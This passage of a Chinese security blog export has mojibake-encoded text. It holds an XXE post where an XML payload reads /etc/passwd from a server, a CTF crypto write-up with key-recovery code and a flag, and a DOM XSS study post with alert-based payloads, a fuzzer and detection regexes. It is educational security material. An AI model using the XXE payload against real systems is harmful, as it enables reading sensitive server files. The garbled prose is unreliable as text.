¼å¼çš„æ•°æ®ã€‚ä½†æ˜¯æœ‰æ—¶å€™æœåŠ¡å™¨å¯ä»¥æ¥å—å¼€å‘äººå‘˜æ²¡æœ‰æ„æ–™åˆ°çš„å…¶ä»–æ•°æ®æ ¼å¼ï¼Œå¦‚xmlæ ¼å¼ã€‚å¦‚æœæœåŠ¡å™¨å¯ä»¥æ¥å—xmlæ ¼å¼çš„æ•°æ®ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½å­˜åœ¨xxeã€‚1234567891011121314151617HTTP Request:POST /netspi HTTP/1.1Host: someserver.netspi.comAccept: application/jsonContent-Type: application/jsonContent-Length: 38&#123;&quot;search&quot;:&quot;name&quot;,&quot;value&quot;:&quot;netspitest&quot;&#125;HTTP Response:HTTP/1.1 200 OKContent-Type: application/jsonContent-Length: 43&#123;&quot;error&quot;: &quot;no results for name netspitest&quot;&#125; å°†å¦‚ä¸Šçš„Content-Typeæ”¹ä¸ºxmlæ ¼å¼çš„å†å‘é€123456789101112131415161718192021HTTP Request:POST /netspi HTTP/1.1Host: someserver.netspi.comAccept: application/jsonContent-Type: application/xmlContent-Length: 112&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;root&gt;&lt;search&gt;name&lt;/search&gt;&lt;value&gt;netspitest&lt;/value&gt;&lt;/root&gt;HTTP Response:HTTP/1.1 200 OKContent-Type: application/jsonContent-Length: 43&#123;&quot;error&quot;: &quot;no results for name netspitest&quot;&#125; å¦‚æœè¿”å›çš„æ•°æ®æ˜¯ä¸€æ ·çš„ï¼Œé‚£ä¹ˆå°±è¯´æ˜æœåŠ¡å™¨å¯ä»¥æ¥å—xmlæ ¼å¼çš„æ•°æ®ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨xxeæ¥æ”»å‡»1234567891011121314151617181920212223242526HTTP Request:POST /netspi HTTP/1.1Host: someserver.netspi.comAccept: application/jsonContent-Type: application/xmlContent-Length: 288&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;root&gt;&lt;search&gt;name&lt;/search&gt;&lt;value&gt;&amp;xxe;&lt;/value&gt;&lt;/root&gt;HTTP Response:HTTP/1.1 200 OKContent-Type: application/jsonContent-Length: 2467&#123;&quot;error&quot;: &quot;no results for name root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/sync.... ä½†æ˜¯å¹¶ä¸æ˜¯æ‰€æœ‰çš„jsonèŠ‚ç‚¹éƒ½æ˜¯æ¥å—xmlæ ¼å¼çš„æ•°æ®çš„ã€‚æœ‰å¯èƒ½è¿”å›è§£æé”™è¯¯çš„æç¤ºæˆ–è€…415ä¸æ”¯æŒåª’ä½“ç±»å‹çš„é”™è¯¯æ¶ˆæ¯ å¸¦ä¸Šä¸€ä¸ªxxe-cheat-sheetï¼ŒDTD-Attackså‚è€ƒsecurity.tencent.comï¼Œ91ri.org"},{"title":"ã€CTFã€‘BCTF Crypto SpecialRSA writeup","permalink":"http://blog.0kami.cn/2016/03/20/old-CTF-BCTF-Crypto-SpecialRSA-writeup/","text":"é¢˜ç›®æè¿°å°†é™„å¸¦çš„zipæ–‡ä»¶ä¸‹è½½å¹¶è§£å‹ã€‚å¯ä»¥çœ‹åˆ°ä»¥ä¸‹å‡ ä¸ªæ–‡ä»¶ï¼š åŠ å¯†ç®—æ³• ç¤ºä¾‹å¯†æ–‡ ç¤ºä¾‹æ˜æ–‡ åŠ å¯†çš„flagæ–‡ä»¶å¤§è‡´æˆ‘ä»¬å¯ä»¥çœ‹å‡ºæ¥ï¼Œé¢˜ç›®çš„æ„å›¾ä¸ºé€šè¿‡ç¤ºä¾‹å¯†æ˜æ–‡ï¼Œç®—å‡ºåŠ å¯†ç§˜é’¥kï¼Œç„¶åé€šè¿‡kè§£å¯†flagæ–‡ä»¶ã€‚é˜…è¯»åŠ è§£å¯†ç®—æ³•ï¼Œæˆ‘ä»¬å¯ä»¥å¾—å‡ºä»¥ä¸‹çš„æ•°å­¦å…¬å¼ï¼š12345gcd(k,N)=1,kd+Ny=1,c=&gt;criphertext,m=&gt;plaintext encode c=[(k^r%N)*m]%N decode m=[(d^r%N)*c]%N å·²çŸ¥2ç»„(m,r,c) N çš„å€¼ æ±‚è§£k åˆ°è¿™é‡Œå¡äº†å¾ˆä¹…ï¼Œä¸€ç›´æ²¡ä¸ªæ­£ç¡®çš„æ–¹å¼æ¥è·å–kï¼Œä¸ç”¨æ•°å­¦å°±ä¼šå¿˜è®°å•Šå•Šå•Šå•Šå•Šå•Šå•Šã€‚åæ¥æ±‚ç»„äº†è€å¸ˆï¼Œå¾—åˆ°äº†ä¸€ä¸ªæ€è·¯ã€‚12345678910ä¸‹é¢æ‰€æœ‰^-1è¡¨ç¤ºå¯¹åº”çš„ä¹˜æ³•é€†å…ƒ å‡è®¾gcd(r1,r2)=1,é‚£ä¹ˆå­˜åœ¨a,bä½¿å¾—å…¬å¼r1*a+r2*b=1 é‚£ä¹ˆ k^1 =k^(r1*a+r2*b) =k^(r1*a) * k^(r2*b) =(k^r1)^a * (k^r2)^bè€Œk^rn å¯ä»¥é€šè¿‡(m,r,c)å¯¹æ¥è·å¾—è¿™é‡Œç›´æ¥ä½¿ç”¨encodeå…¬å¼c=[(k^r%N)*m]%Né€šè¿‡æ¨å¯¼å¯ä»¥å¾—å‡ºk^r=c*(m^-1)mçš„é€†å…ƒå¯ä»¥é€šè¿‡æ‰©å±•æ¬§å‡ é‡Œå¾·ç®—æ³•æ¥æ±‚å¾— æœ‰äº†ä¸Šé¢çš„æ€è·¯ï¼Œå°±å¯ä»¥å†™ç¨‹åºæ¥åŠ è§£å¯†äº†ï¼Œè¿™é‡Œæˆ‘ç”¨äº†pythonæ¥å†™ï¼Œå…¶ä¸­(m,r,c)å¯¹æˆ‘äº‹å…ˆæ‹¿å‡ºæ¥äº†ï¼Œæ¸…æ¥šä¸€ç‚¹,ä¸‹é¢çš„ç¨‹åºæ˜¯æ¥ç®—kçš„123456789101112131415161718192021222324252627282930313233343536373839404142434445import msgpackfrom Crypto.PublicKey import RSAN = 23927411014020695772934916764953661641310148480977056645255098192491740356525240675906285700516357578929940114553700976167969964364149615226568689224228028461686617293534115788779955597877965044570493457567420874741357186596425753667455266870402154552439899664446413632716747644854897551940777512522044907132864905644212655387223302410896871080751768224091760934209917984213585513510597619708797688705876805464880105797829380326559399723048092175492203894468752718008631464599810632513162129223356467602508095356584405555329096159917957389834381018137378015593755767450675441331998683799788355179363368220408879117131Ldef Ext_Euclid (a , b ): ''' æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³• a*x + b*y = gcd(a,b) è¿”å› x,yä»¥åŠaï¼Œbçš„æœ€å¤§å…¬çº¦æ•°gcd :param a: :param b: :return:x,yä»¥åŠaï¼Œbçš„æœ€å¤§å…¬çº¦æ•°gcd ''' if (b == 0): return 1 , 0 , a else: x , y , q=Ext_Euclid( b , a % b ) x , y = y,( x - (a // b) * y ) return x , y , qm1=8246074182642091125578311828374843698994233243811347691229334829218700728624047916518503687366611595562099039411430662968666847086659721231623198995017758424796091810259884653332576136128144958751327844746991264667007359518181363522934430676655236880489550093852524801304612322373542296281962196795304499711006801211783005857297362930338978872451934860435597545642219213551685973208209873623909629278321181485010964460652298690058747090298312365230671723790850998541956664376820820570709272500330966205578898690396706695024001970727864091436518202414166919020415892764617055978488996164642229582717493375419993187360Lc1=14548997380897265239778884825381301109965518989661808090688952232381091726761464959572943383024428028270717629953894592890859128818839328499002950828491521254480795364789013196240119403187073307558598496713832435709741997056117831860370227155633169019665564392649528306986826960829410120348913586592199732730933259880469229724149887380005627321752843489564984358708013300524640545437703771424168108213045567568595093421366224818609501318783680497763353618110184078118456368631056649526433730408976988014678391205055298782061128568056163894010397245301425676232126267874656710256838457728944370612289985071385621160886Lm11=RSA.inverse(m1,N)# æ±‚é€†å…ƒkr1=m11*c1m2=15575051453858521753108462063723750986386093067763948316612157946190835527332641201837062951012227815568418309166473080588354562426066694924364886916408150576082667797274000661726279871971377438362829402529682825471299861814829463510659258586020732228351258291527965822977048954720558973840956731377322516168809373640494227129998871167089589689796024458501705704779109152762373660542684880052489213039920383757930855300338529058000330103359636123251274293258Lc2=12793942795110038319724531875568693507469327176085954164034728727511164833335101755153514030256152878364664079056565385331901196541015393609751624971554016671160730478932343949538202167508319292084519621768851878526657022981883304260886841513342396524869530063372782511380879783246034751883691295368172069170967975561364277514063320691930900258017293871754252209727301719207692321798229276732198521711602080244950295889575423383308099786298184477668302842952215665734671829249323604032320696267130330613134368640401070775927197554082071807605399448960911234829590548855031180158567578928333030631307816223152118126597Lm21=RSA.inverse(m2,N)kr2=m21*c2# print kr2r1=12900676191620430360427117641859547516838813596331616166760756921115466932766990479475373384324634210232168544745677888398849094363202992662466063289599443Lr2=7718975159402389617924543100113967512280131630286624078102368166185443466262861344357647019797762407935675150925250503475336639811981984126529557679881059La,b,_=Ext_Euclid(r1,r2)print aprint b# print a*r1+b*r2x1=RSA.inverse(kr2,N)k=(pow(kr1, a,N)*pow(x1,-b,N))%Nprint k é€šè¿‡ä¸Šé¢çš„ç¨‹åºå¯ä»¥ç®—å‡º k=175971776542095822590595405274258668271271366360140578776612582276966567082080372980811310146217399585938214712928761559525614866113821551467842221588432676885027725038849513527080849158072296957428701767142294778752742980766436072183367444762212399986777124093501619273513421803177347181063254421492621011961L æ¥ä¸‹æ¥å°±ç®€å•äº†å°†kå¸¦å…¥å®˜æ–¹çš„ç®—æ³•å°±å¯ä»¥å¾—åˆ°flag.BCTF{q0000000000b3333333333-ju57-w0n-pwn20wn!!!!!!!!!!!!}ä¸Šé¢ç¨‹åºä¸­éœ€è¦æ³¨æ„çš„æ˜¯powå‡½æ•°ä¸æ”¯æŒæŒ‡æ•°ä¸ºè´Ÿæ•°çš„æƒ…å†µï¼Œæ‰€ä»¥è¿˜è¦å†è½¬ä¸€ä¸‹å¼¯ã€‚ 1234a&gt;0,b&lt;0(k^r)^b=(k^-r)^-bæ‰€ä»¥å¯ä»¥å…ˆæ±‚å‡ºk^r mod Nçš„é€†å…ƒ æ€»ç»“æ•°å­¦æ–¹é¢çš„çŸ¥è¯†è¿˜æ˜¯çŸ­æ¿å•Šï¼Œä»¥åå¾—åŠ å¼ºä¸€ä¸‹:)"},{"title":"ã€VULNERABLITYã€‘DOM XSS","permalink":"http://blog.0kami.cn/2016/03/17/old-DOM-XSS/","text":"å¼•è¨€ è¿™å‡ å¤©é˜…è¯»äº†ã€ŠWebå‰ç«¯é»‘å®¢æŠ€æœ¯æ­ç§˜ã€‹ ï¼Œå¯¹DOMå‹çš„XSSè¿›è¡Œä¸€ä¸ªæ€»ç»“ï¼Œå†…å®¹ä¸»è¦ä¸ºä¹¦ä¸­æåˆ°çš„çŸ¥è¯†ç‚¹ï¼Œæ•´ç†æ•´ç†ä½œä»¥åå¤ä¹ æ‰€ç”¨ã€‚ DOMç±»å‹çš„XSSä¸åå°„å‹ã€å­˜å‚¨å‹XSSéƒ½ä¸åŒï¼ŒDOMå‹XSSä¸ç”¨æœåŠ¡å™¨ç«¯è§£æå“åº”çš„å‚ä¸ï¼Œè§¦å‘DOMå‹XSSå¯ä»¥è¯´ä¸»è¦ä¾é æµè§ˆå™¨å®¢æˆ·ç«¯çš„è§£æã€‚å¸¸è§çš„è¾“å‡ºç‚¹è§0x04é™„å½•ã€‚ DOMæ¸²æŸ“ é¦–å…ˆæˆ‘ä»¬æ¥ç†è§£ä¸€ä¸‹HTMLä¸Javascriptè‡ªè§£ç æœºåˆ¶ï¼ŒæŸ¥çœ‹ä»¥ä¸‹ä¸‰ä¸ªä¾‹å­123456789101112131. &lt;input type=&quot;button&quot; id=exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(&apos;&lt;img src=@ onerror=alert(123) /&gt;&apos;)&quot; /&gt;2. &lt;input type=&quot;button&quot; id=exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(HtmlEncode(&apos;&lt;img src=@ onerror=alert(123) /&gt;&apos;))&quot; /&gt;&lt;script&gt; function HtmlEncode(str) &#123; var s=&quot;&quot;; if(str.length==0) return &quot;&quot;; s=str.replace(/&amp;/g, &quot;&amp;amp;&quot;); s=str.replace(/&lt;/g, &quot;&amp;lt;&quot;); s=str.replace(/&gt;/g, &quot;&amp;gt;&quot;); s=str.replace(/\\&quot;/g, &quot;&amp;quot;&quot;); return s; &#125;3. &lt;input type=&quot;button&quot; id=exec_btn&quot; value=&quot;exec&quot; onclick=&quot;document.write(&apos;&amp;lt;img src=@ onerror=alert(123) /&amp;gt;&apos;)&quot; /&gt; å¯¹äºç¬¬ä¸€ç§æƒ…å†µï¼Œå¾ˆæ¸…æ¥šï¼Œç‚¹å‡»è¿™ä¸ªæŒ‰é’®åï¼Œä¼šå°†&lt;img src=@ onerror=alert(123) /&gt;å†™å…¥DOMä¸­ï¼Œå¹¶è§¦å‘alert(123)ã€‚è€Œç¬¬äºŒç§ä¸ç¬¬ä¸‰ç§ï¼Œdocument.writeçš„å†…å®¹éƒ½å˜æˆäº†&amp;lt;img src=@ onerror=alert(123) /&amp;gt;ï¼ŒåŒºåˆ«åœ¨äºä¸€ä¸ªæ˜¯åœ¨HTMLæ ‡ç­¾ä¸­,ä¸€ä¸ªæ˜¯é€šè¿‡Javascriptå¤„ç†åæ‰å˜æˆè¿™ä¸ªæ ·å­çš„ï¼Œé‚£ä¹ˆè¿™2ç§æƒ…å†µéƒ½ä¼šè§¦å‘å¼¹çª—å—ï¼Ÿç­”æ¡ˆæ˜¯ç¬¬äºŒç§ä¸ä¼šï¼Œè€Œç¬¬ä¸‰ç§ä¼šè§¦å‘ã€‚ å½¢æˆè¿™æ ·çš„åŸå› å°±æ˜¯å› ä¸ºHTMLä¸Javascriptè‡ªè§£ç æœºåˆ¶ï¼Œåœ¨HTMLæ ‡ç­¾ä¸­çš„javascriptå¯ä»¥è¿›è¡ŒHTMLå½¢å¼çš„ç¼–ç ã€‚åœ¨HTMLæ ‡ç­¾ä¸­çš„javascriptä»£ç ä¼šå…ˆè¢«HTMLå½¢å¼çš„ç¼–ç è¿›è¡Œè§£ç ï¼Œå³ç¬¬ä¸‰ç§æƒ…å†µä¸­&amp;lt;img src=@ onerror=alert(123) /&amp;gt;åœ¨javascriptè¿è¡Œå‰å·²ç»è§£ç ä¸º&lt;img src=@ onerror=alert(123) /&gt;ï¼Œè€Œç¬¬äºŒç§æƒ…å†µä¸ºjavascriptè¿è¡Œä¸­è¿›è¡Œçš„HTMLå½¢å¼çš„ç¼–ç ï¼Œæ‰€ä»¥å†™åˆ°DOMä¸­æ—¶ç›´æ¥æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šã€‚HTMLä¸­çš„ç¼–ç ï¼š è¿›åˆ¶ç¼–ç ï¼š&#xH;(åå…­è¿›åˆ¶æ ¼å¼)ã€&#D;(åè¿›åˆ¶æ ¼å¼),æœ€åçš„åˆ†å·å¯ä»¥ä¸è¦ HTMLå®ä½“ç¼–ç ï¼šå³ä¸Šé¢çš„é‚£ä¸ªHtmlEncode é‚£ä¹ˆåŒæ ·çš„ï¼Œåœ¨javascriptä¸Šä¸‹æ–‡ç¯å¢ƒä¸­ï¼Œå°†å†…å®¹æ”¹ä¸ºjavascriptçš„ç¼–ç ï¼ŒåŒæ ·ä¼šè‡ªè§£ç ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹ä¸€ä¸ªä¾‹å­12345678&lt;input type=&quot;button&quot; id=&quot;exec_btn&quot; value=&quot;exec&quot; /&gt;&lt;script&gt; function $(id)&#123;return document.getElementById(id);&#125;; $(&apos;exec_btn&apos;).onclick=function()&#123; document.write(&apos;&lt;img src=@ onerror=alert(123) /&gt;&apos;); document.write(&apos;\\u003c\\u0069\\u006d\\u0067\\u0020\\u0073\\u0072\\u0063\\u003d\\u0040\\u0020\\u006f\\u006e\\u0065\\u0072\\u0072\\u006f\\u0072\\u003d\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0032\\u0033\\u0029\\u0020\\u002f\\u003e&apos;); &#125; ä¸Šé¢2ä¸­writeå‡ºç°çš„ç»“æœæ˜¯ç›¸åŒçš„ï¼ŒåŒæ ·çš„é“ç†ï¼Œç”±äºä¸Šè¿°ç¼–ç ä¸ºjavascriptçš„ç¼–ç å½¢å¼ï¼Œå¹¶ä¸”åœ¨javascriptçš„ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­ï¼Œä¼šå…ˆè¿›è¡Œè§£ç ï¼Œå†è¿è¡Œjavascriptã€‚JavaScriptä¸­çš„ç¼–ç ï¼š Unicodeå½¢å¼ï¼š\\uH æ™®é€šåå…­è¿›åˆ¶ï¼š\\xH çº¯è½¬ä¹‰ï¼š\\â€™ã€\\â€ã€\\&lt;ã€>è¿™æ ·åœ¨ç‰¹æ®Šå­—ç¬¦å‰åŠ \\è¿›è¡Œè½¬ä¹‰ é€šè¿‡ä¸Šé¢å‡ ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“åœ¨HTMLä¸­ä¸åœ¨Javascriptä¸­è‡ªåŠ¨è§£ç çš„å·®å¼‚ï¼Œå¦‚æœé˜²å¾¡æ²¡æœ‰åŒºåˆ†è¿™æ ·çš„åœºæ™¯ï¼Œå°±ä¼šå‡ºç°é—®é¢˜ã€‚ ç†è§£äº†ä¸Šè¿°çš„è‡ªè§£ç æœºåˆ¶ï¼Œåœ¨ä¸åŒçš„æ ‡ç­¾ä¸‹ä¼šæœ‰ä¸åŒçš„ç»“æœï¼Œæ¯”å¦‚ä¸€ä¸‹å‡ ä¸ªæ ‡ç­¾ä¼šè‡ªå¸¦HtmlEncodeåŠŸèƒ½12345678&lt;title&gt;&lt;/title&gt;&lt;iframe&gt;&lt;/iframe&gt;&lt;noscript&gt;&lt;/noscript&gt;&lt;noframes&gt;&lt;/noframes&gt;&lt;textarea&gt;&lt;/textarea&gt;&lt;xmp&gt;&lt;/xmp&gt;&lt;plaintext&gt;&lt;/plaintext&gt; &lt;xmp&gt;æ²¡æœ‰HtmlEncodeåŠŸèƒ½ï¼Œ&lt;plaintext&gt;åœ¨Firefoxä¸‹ä¼šè¿›è¡ŒHtmlEncodeç¼–ç ï¼Œåœ¨chromeä¸‹ä¸ä¼šã€‚ DOM fuzzing ç›´æ¥çœ‹ä»£ç æŠŠ ä¸‹é¢çš„ç¨‹åºç”¨pythonç¼–å†™123456789101112131415161718192021222324252627282930313233def get_template(template_file): &quot;&quot;&quot;è·å–fuzzingçš„æ¨¡æ¿æ–‡ä»¶å†…å®¹&quot;&quot;&quot; content=&apos;&apos; with open(template_file) as f: content=f.read() return contentdef set_result(result_file,result): &quot;&quot;&quot;ç”Ÿæˆfuzzingç»“æœæ–‡ä»¶&quot;&quot;&quot; with open(result_file,&apos;w&apos;) as f: f.write(result)def fuzzing(fuzz_file,result_file): template=get_template(fuzz_file) fuzz_area_0=template.find(&apos;&lt;fuzz&gt;&apos;) fuzz_area_1=template.find(&apos;&lt;/fuzz&gt;&apos;) fuzz_area=template[fuzz_area_0+6:fuzz_area_1].strip() # chars=[] chars=[] for i in xrange(255): # ASCIIç›è½¬æ¢ä¸ºå­—ç¬¦ if i!=62: chars.append(chr(i)) fuzz_area_result=&apos;&apos; for c in chars: #éå†è¿™äº›å­—ç¬¦ é€ä¸€ç”Ÿæˆfuzzingå†…å®¹ fuzz_area_r=fuzz_area.replace(&apos;&#123;&#123;char&#125;&#125;&apos;,c) fuzz_area_r=fuzz_area_r.replace(&apos;&#123;&#123;id&#125;&#125;&apos;,str(ord(c))) fuzz_area_result+=fuzz_area_r+&apos;\\n&apos; print fuzz_area_r result=template.replace(fuzz_area,fuzz_area_result) set_result(result_file,result)if __name__==&apos;__main__&apos;: fuzzing(&quot;fuzz_xss_0.html&quot;,&quot;res.html&quot;) ä¸‹é¢ä¸ºfuzz_xss_0.htmlçš„å†…å®¹12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Fuzz xss 0&lt;/title&gt; &lt;script&gt; function $(x)&#123;return document.getElementById(x);&#125; function f(id)&#123; $(&apos;result&apos;).innerHTML+=id+&apos;&lt;br/&gt;&apos;; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;h3&gt;Fuzzing Result:&lt;/h3&gt;&lt;code&gt; &#123;&#123;id&#125;&#125;: &lt;&#123;&#123;char&#125;&#125;script&gt;f(&quot;&#123;&#123;id&#125;&#125;&quot;)&lt;/script&gt;&lt;/code&gt;&lt;div id=&quot;result&quot;&gt;&lt;/div&gt;&lt;br/&gt;&lt;h3&gt;Fuzzing...&lt;/h3&gt;&lt;fuzz&gt; &#123;&#123;id&#125;&#125;: &lt;&#123;&#123;char&#125;&#125;script&gt;f(&quot;&#123;&#123;id&#125;&#125;&quot;)&lt;/script&gt;&lt;br/&gt;&lt;/fuzz&gt;&lt;/body&gt;&lt;/html&gt; é€šè¿‡ä¸Šé¢çš„fuzzingæŠ€å·§ï¼Œå¯ä»¥è‡ªè¡Œæ‰©å±• DOM XSS æŒ–æ˜ é™æ€æ–¹æ³• é™æ€æ–¹æ³•æŸ¥æ‰¾å±é™©å…³é”®å­—ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹åˆ—æ­£åˆ™è¡¨è¾¾å¼æ¥åŒ¹é…ã€‚123456789101112131415Finding SourcesThe following regular expression attempts to match most common DOMXSS sources (BETA):/(location\\s*[\\[.])|([.\\[]\\s*[&quot;&apos;]?\\s*(arguments|dialogArguments|innerHTML|write(ln)?|open(Dialog)?|showModalDialog|cookie|URL|documentURI|baseURI|referrer|name|opener|parent|top|content|self|frames)\\W)|(localStorage|sessionStorage|Database)/Finding SinksThe following regular expression attempts to match most common DOMXSS sinks (BETA):/((src|href|data|location|code|value|action)\\s*[&quot;&apos;\\]]*\\s*\\+?\\s*=)|((replace|assign|navigate|getResponseHeader|open(Dialog)?|showModalDialog|eval|evaluate|execCommand|execScript|setTimeout|setInterval)\\s*[&quot;&apos;\\]]*\\s*\\()/This regular expression finds sinks based on jQuery, it also finds the $ function, which is not always insecure:/after\\(|\\.append\\(|\\.before\\(|\\.html\\(|\\.prepend\\(|\\.replaceWith\\(|\\.wrap\\(|\\.wrapAll\\(|\\$\\(|\\.globalEval\\(|\\.add\\(|jQUery\\(|\\$\\(|\\.parseHTML\\(/ è¯¦æƒ…å¯ä»¥çœ‹https://code.google.com/archive/p/domxsswiki/wikis/FindingDOMXSS.wikiä¸€æ—¦å‘ç°é¡µé¢å­˜åœ¨å¯ç–‘ç‰¹å¾ï¼Œå°±è¿›è¡Œäººå·¥åˆ†æï¼Œè¿™æ˜¯é™æ€æ–¹æ³•çš„ä»£ä»·ï¼Œå¯¹äººå·¥å‚ä¸è¦æ±‚å¾ˆé«˜ åŠ¨æ€æ–¹æ³• åŠ¨æ€æ–¹æ³•ç›¸å½“äºä¸€æ¬¡Javascriptæºç åŠ¨æ€å®¡è®¡çš„è¿‡ç¨‹ã€‚ä¹¦ä¸­æåˆ°äº†ä¸¤ç§æ€è·¯123&lt;script&gt;eval(location.hash.substr(1));&lt;/script&gt; å°±æ‹¿ä¸Šé¢çš„ä¾‹å­æ¥è¯´ï¼Œå¦‚ä½•æ£€æµ‹ä¸Šé¢çš„DOM XSS æ€è·¯ä¸€ å€Ÿç”¨æµè§ˆå™¨è‡ªèº«çš„åŠ¨æ€æ€§ï¼Œå¯ä»¥å†™Firefoxæ’ä»¶ï¼Œæ‰¹é‡å¯¹ç›®æ ‡åœ°å€å‘èµ·è¯·æ±‚ï¼ˆä¸€ä¸ªæ¨¡ç³Šæµ‹è¯•çš„è¿‡ç¨‹ï¼‰ï¼Œè¯·æ±‚çš„å½¢å¼ä¸ºï¼šåœ¨ç›®æ ‡åœ°å€ååŠ ä¸Š#fuzzingå†…å®¹ï¼Œå°±å½“å‰è¿™ä¸ªä¾‹å­æ¥è¯´ã€‚æ¯”å¦‚å½“å‰fuzzingå†…å®¹ä¸ºï¼švar x=&#39;d0mx55&#39; å¹¶ä¸”å¯¹å¸¸è§çš„è¾“å‡ºç‚¹å‡½æ•°è¿›è¡ŒåŠ«æŒï¼Œå¦‚123456var _eval=eval;eval=function(x)&#123; if(typeof(x)==&apos;undefined&apos;)&#123;return;&#125; if(x.indexOf(&apos;d0mx55&apos;)!=-1)&#123;alert(&apos;found dom xss&apos;); _eval(x);&#125;; åœ¨javascriptå±‚é¢åŠ«æŒinnerHTMLè¿™æ ·çš„å±æ€§å·²ç»æ²¡é‚£ä¹ˆå®¹æ˜“äº†ï¼Œå¸¸ç”¨çš„å±æ€§åŠ«æŒå¯ä»¥é’ˆå¯¹å…·ä½“çš„å¯¹è±¡è®¾ç½®__defineSetter__ï¼Œæ¯”å¦‚ä¸‹é¢çš„ä»£ç 12window.__defineSetter__(&apos;x&apos;,function()&#123;alert(&apos;hijack x&apos;)&#125;);window.x=&apos;xxxxxYYYYYYYY&apos;; å½“xèµ‹å€¼çš„æ—¶å€™ï¼Œå°±ä¼šè§¦å‘äº‹å…ˆå®šä¹‰å¥½çš„Setteræ–¹æ³•ã€‚innerHTMLå±æ€§å±äºé‚£äº›èŠ‚ç‚¹å¯¹è±¡ï¼Œæƒ³åŠ«æŒå…·ä½“èŠ‚ç‚¹å¯¹è±¡çš„innerHTMLï¼Œéœ€è¦äº‹å…ˆçŸ¥é“è¿™ä¸ªå…·ä½“èŠ‚ç‚¹çš„å¯¹è±¡ï¼Œç„¶åè®¾ç½®__defineSetter__,è¿™æ ·å¦‚æœè¦æ£€æµ‹DOM XSSï¼Œå°±è¦åŠ«æŒæ‰€æœ‰çš„è¾“å‡ºç‚¹ï¼Œæ¯”è¾ƒéº»çƒ¦ï¼Œé‚£ä¹ˆæ€è·¯äºŒå¯èƒ½ä¼šæ¯”è¾ƒç®€å•ä¸€ç‚¹ æ€è·¯äºŒ ä»ç„¶å€Ÿç”¨æµè§ˆå™¨åŠ¨æ€æ‰§è¡Œçš„ä¼˜åŠ¿ï¼Œå†™ä¸€ä¸ªFirefoxæ’ä»¶ï¼Œæˆ‘ä»¬å®Œå…¨ä»¥é»‘ç›’çš„æ–¹å¼è¿›è¡Œæ¨¡ç³Šæµ‹è¯•è¾“å…¥ç‚¹ï¼Œç„¶ååˆ¤æ–­æ¸²æŸ“åçš„DOMæ ‘ä¸­æ˜¯å¦æœ‰æˆ‘ä»¬æœŸå¾…çš„å€¼ï¼Œæ¯”å¦‚ï¼Œæ¨¡ç³Šæµ‹è¯•çš„å†…å®¹éƒ½æœ‰å¦‚ä¸‹ä¸€æ®µä»£ç document.write(&#39;d0m&#39;+&#39;x55&#39;)å¦‚æœè¿™æ®µä»£ç é¡ºåˆ©æ‰§è¡Œäº†å°±ä¼šå­˜åœ¨d0mx55æ–‡æœ¬èŠ‚ç‚¹ï¼Œåç»­çš„æ£€æµ‹å·¥ä½œåªè¦åˆ¤æ–­æ˜¯å¦å­˜åœ¨è¿™ä¸ªæ–‡æœ¬èŠ‚ç‚¹å°±å¯ä»¥äº†123if(document.documentElement.innerHTML.indexOf(&apos;d0mx55&apos;)!=-1)&#123; alert(&apos;found dom xss&apos;);&#125; è¿™ä¸ªæ€è·¯ä»¥DOMæ ‘çš„æ”¹å˜ä¸ºåˆ¤æ–­ä¾æ®ï¼Œç®€å•å‡†ç¡®ï¼Œä½†æ˜¯åŒæ ·æ— æ³•é¿å…é‚£äº›é€»è¾‘åˆ¤æ–­ä¸Šå¯¼è‡´çš„æ¼æŠ¥ã€‚ é™„å½• è¾“å‡ºç‚¹ javascript code ç›´æ¥è¾“å‡ºHTMLå†…å®¹ document.write(â€¦)document.writeln(â€¦) document.body.innerHtml=â€¦ ç›´æ¥ä¿®æ”¹DOMæ ‘ï¼ˆåŒ…æ‹¬DHTMLäº‹ä»¶ï¼‰ document.forms[0].action=â€¦document.attachEvent(â€¦)document.createâ€¦(â€¦)document.execCommand(â€¦)document.body. â€¦widow.attachEvent(â€¦) æ›¿æ¢document url document.location=â€¦(ä»¥åŠç›´æ¥èµ‹å€¼ç»™locationçš„href,host,hostnameå±æ€§)document.location.hostname=â€¦document.location.replace(â€¦)document.location.assign(â€¦)documnent.URL=â€¦window.navigate(â€¦) æ‰“å¼€æˆ–ä¿®æ”¹æ–°çª—å£ document.open(â€¦)window.open(â€¦)window.location.href=â€¦(ä»¥åŠç›´æ¥èµ‹å€¼ç»™locationçš„href,host,hostnameå±æ€§) ç›´æ¥æ‰§è¡Œè„šæœ¬ eval(â€¦)window.execScript(â€¦)window.setInterval(â€¦)window.setTimeout(â€¦)"},{"title":"ã€OTHERSã€‘flask virtualenvç¯å¢ƒæ­å»º","permalink":"http://blog.0kami.cn/2016/03/16/old-flask-virtualenv/","text":"å¼•è¨€python virtualenvä¸ºflaskç­‰webæ¡†æ¶æä¾›è™šæ‹Ÿpythonç¯å¢ƒï¼ˆå…¶ä»–åº”ç”¨ä¹Ÿå¯ä»¥ï¼‰ï¼Œè¿™æ 